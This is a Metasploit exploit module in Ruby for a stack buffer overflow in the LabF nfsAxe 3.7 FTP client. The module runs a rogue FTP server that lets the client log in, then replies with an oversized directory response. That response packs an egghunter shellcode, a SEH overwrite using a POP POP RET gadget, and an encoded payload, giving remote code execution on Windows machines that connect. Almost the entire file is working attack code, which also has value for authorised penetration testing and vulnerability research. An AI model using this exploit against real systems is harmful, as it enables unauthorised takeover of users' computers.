##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'LabF nfsAxe 3.7 FTP Client Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in the LabF nfsAxe 3.7 FTP Client allowing remote code execution.
      },
      'Author'   =>
        [
          'Tulpa',  # Original exploit author
          'Daniel Teixeira'   # MSF module author
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB', '42011' ],
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x10",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', {} ],
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
      'SRVHOST' => '0.0.0.0',
        },
      'DisclosureDate' => 'May 15 2017',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The FTP port to listen on", 21 ]),
      ])
  end

  def on_client_connect(client)
    return if ((p = regenerate_payload(client)) == nil)


    # Let the client log in
    client.get_once
    welcome = "220 Welcome.\r\n"
    client.put(welcome)

    client.get_once
    user = "331 OK.\r\n"
    client.put(user)

    client.get_once
    pass = "230 OK.\r\n"
    client.put(pass)
    client.get_once

    egg = "w00tw00t"
    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

    nseh = "\x90\x90\xEB\x05" #JMP over SEH
    seh = "\x9F\x54\x01\x68"  #POP POP RET 6801549F in WCMDPA10.DLL
 
    sploit = "220 \""
    sploit << "\20"*100
    sploit << egg
    sploit << "\x90"*10
    sploit << payload.encoded
    sploit << "\x20"*(9266 - payload.encoded.length)
    sploit << nseh
    sploit << seh
    sploit << egghunter
    sploit << "\x20"*576
    sploit << "\" is current directory\r\n"

    client.put(sploit)

  end
end
